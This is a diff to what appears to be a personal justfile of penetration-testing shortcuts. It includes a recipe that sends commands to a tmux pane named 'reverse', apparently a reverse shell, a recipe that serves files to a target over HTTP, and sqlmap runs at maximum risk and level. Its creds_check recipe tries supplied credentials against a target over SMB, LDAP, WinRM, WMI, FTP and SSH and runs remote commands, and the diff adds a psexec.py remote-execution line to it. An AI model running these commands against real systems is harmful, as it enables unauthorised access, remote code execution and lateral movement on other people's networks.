@@ -171,7 +171,7 @@ prev cmd:
 	tmux send-keys -t reverse.0  "{{cmd}}" Enter
 	@sleep 1.0 # give it time to run
 #
-	
+
 #start a http server for the current directory
 hs port:
 	@echo curl http://$(hack lip)/
@@ -185,13 +185,15 @@ sqli:
 sqliraw:
 	sqlmap -r raw.http --risk 3 --level 5
 
-
 creds_check user pass:
 	nxc --verbose smb $(hack ip) -u "{{user}}" -p '{{pass}}' -X "whoami"
 	nxc --verbose ldap $(hack ip) -u "{{user}}" -p '{{pass}}'
 	nxc --verbose winrm $(hack ip) -u "{{user}}" -p '{{pass}}' -X "whoami"
 	nxc --verbose wmi $(hack ip) -u "{{user}}" -p '{{pass}}' -x "whoami"
 	nxc --verbose wmi $(hack ip) -u "{{user}}" -p '{{pass}}' --local-auth -x "whoami"
+	psexec.py '{{user}}:{{pass}}'@$(hack ip)
+	nxc --verbose ftp $(hack ip) -u "{{user}}" -p '{{pass}}'
+	nxc --verbose ssh $(hack ip) -u "{{user}}" -p '{{pass}}'
 
 ldap:
 	nmap -Pn -sV --script "ldap* and not brute" -p 389 $(hack ip) -o nmap.ldap.txt
